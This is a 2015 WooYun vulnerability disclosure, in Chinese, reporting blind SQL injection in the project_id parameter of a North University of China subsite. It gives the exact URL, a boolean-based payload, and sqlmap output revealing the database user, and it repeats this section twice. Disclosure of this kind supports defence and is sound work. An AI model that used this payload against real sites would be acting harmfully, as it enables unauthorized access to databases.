wybug_title: 中北大学分站sql注入漏洞
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-19：	细节已通知厂商并且等待厂商处理中									2015-07-20：	厂商已经确认，细节仅向厂商公开									2015-07-30：	细节向核心白帽子及相关领域专家公开									2015-08-09：	细节向普通白帽子公开									2015-08-19：	细节向实习白帽子公开									2015-09-03：	细节向公众公开  简要描述： 中北大学分站sql注入漏洞 求邀请码 在wooyun查过了这个点没人提交。  详细说明：  http://www1.nuc.edu.cn/gzcadmin/projectquery/index.php/Home/Index/detail?project_id=590Payload: project_id=590) AND 5328=5328 AND (6507=6507sqlmap identified the following injection points with a total of 34 HTTP(s) requests:---Place: GETParameter: project_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: project_id=590) AND 5328=5328 AND (6507=6507---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: project_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: project_id=590) AND 5328=5328 AND (6507=6507---current user:    'gzcadmin@localhost'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---   漏洞证明：  http://www1.nuc.edu.cn/gzcadmin/projectquery/index.php/Home/Index/detail?project_id=590Payload: project_id=590) AND 5328=5328 AND (6507=6507在wooyun查过了这个点没人提交。sqlmap identified the following injection points with a total of 34 HTTP(s) requests:---Place: GETParameter: project_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: project_id=590) AND 5328=5328 AND (6507=6507---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: project_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: project_id=590) AND 5328=5328 AND (6507=6507---current user:    'gzcadmin@localhost'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---

   修复方案：  过滤就好了   版权声明：转载请注明来源 linkey@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-07-20 07:54 厂商回复： 通知中 最新状态： 暂无
